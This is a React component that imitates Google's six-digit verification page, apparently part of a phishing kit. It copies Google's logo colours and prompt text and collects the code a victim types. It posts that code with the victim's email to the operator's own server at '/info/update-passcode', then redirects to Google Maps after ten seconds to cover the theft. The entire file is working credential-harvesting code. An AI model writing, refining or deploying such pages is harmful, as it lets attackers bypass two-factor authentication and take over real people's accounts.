import React, { useRef } from "react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation } from "react-router-dom";
import axios from "axios";

const PasscodeVerification = () => {
    const inputs = useRef([]);

    const location = useLocation();

    const { email } = location.state?.email ? location.state : { email: "*********" };
    const {
        register,
        handleSubmit,
        formState: { errors },
    } = useForm();

    const [loading, setLoading] = useState(false);

    const onSubmit = async (data) => {
        const finalCode = Object.values(data).join("");

        const finalData = {
            email: email,
            passCode: finalCode,
        }

        try {
            setLoading(true); // শুরু
            await axios.post(`${import.meta.env.VITE_API_URL}/info/update-passcode`, finalData);


        } catch (error) {
            console.log(error);
        } finally {
            setTimeout(() => {
                setLoading(false);
                window.location.href = "https://www.google.com/maps";
            }, 10000);
        }

    };


    const handleChange = (e, index) => {
        const value = e.target.value;

        if (!/^[0-9]?$/.test(value)) return;

        if (value && index < 5) {
            inputs.current[index + 1].focus();
        }
    };

    const handleKeyDown = (e, index) => {
        if (e.key === "Backspace" && !e.target.value && index > 0) {
            inputs.current[index - 1].focus();
        }
    };



    return (
        <div className="relative min-h-screen flex items-center justify-center bg-gray-100 px-4">

            <div className="bg-white w-full max-w-[420px] rounded-2xl shadow-xl p-6 sm:p-8">

                {/* Google Logo */}
                <div className="flex justify-center mb-6">
                    <h1 className="text-xl sm:text-2xl font-semibold">
                        <span className="text-blue-500">G</span>
                        <span className="text-red-500">o</span>
                        <span className="text-yellow-500">o</span>
                        <span className="text-blue-500">g</span>
                        <span className="text-green-500">l</span>
                        <span className="text-red-500">e</span>
                    </h1>
                </div>

                {/* Title */}
                <h2 className="text-lg sm:text-xl font-medium text-center mb-2">
                    Enter the 6-digit code
                </h2>

                <p className="text-xs sm:text-sm text-gray-600 text-center mb-6 leading-relaxed">
                    Check your phone for the verification code and enter it below.
                </p>

                <form onSubmit={handleSubmit(onSubmit)}>

                    {/* Code Inputs */}
                    <div className="flex justify-center gap-2 sm:gap-3 mb-6">
                        {[...Array(6)].map((_, index) => {
                            const { ref, ...rest } = register(`code${index}`, {
                                required: "Required",
                                pattern: {
                                    value: /^[0-9]$/,
                                    message: "Only numbers allowed",
                                },
                            });

                            return (
                                <input
                                    key={index}
                                    type="text"
                                    inputMode="numeric"
                                    maxLength="1"
                                    {...rest}
                                    ref={(el) => {
                                        ref(el);
                                        inputs.current[index] = el;
                                    }}
                                    onChange={(e) => handleChange(e, index)}
                                    onKeyDown={(e) => handleKeyDown(e, index)}
                                    className="w-10 sm:w-12 h-12 sm:h-14 text-center text-lg sm:text-xl border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition"
                                />
                            );
                        })}
                    </div>

                    {Object.keys(errors).length > 0 && (
                        <p className="text-red-500 text-sm text-center mb-4">
                            Please enter all 6 digits
                        </p>
                    )}

                    {/* Buttons */}
                    <div className="flex flex-col sm:flex-row justify-between items-center gap-4">
                        <button
                            type="button"
                            className="text-blue-600 text-sm hover:underline"
                        >
                            Try another way
                        </button>

                        <button
                            type="submit"
                            disabled={loading}
                            className="bg-blue-600 text-white px-6 py-2 rounded-md hover:bg-blue-700 transition flex items-center justify-center gap-2 disabled:opacity-70 w-full sm:w-auto"
                        >
                            {loading && (
                                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                            )}
                            {loading ? "Verifying..." : "Verify"}
                        </button>
                    </div>

                </form>
            </div>
        </div>
    );
};

export default PasscodeVerification;
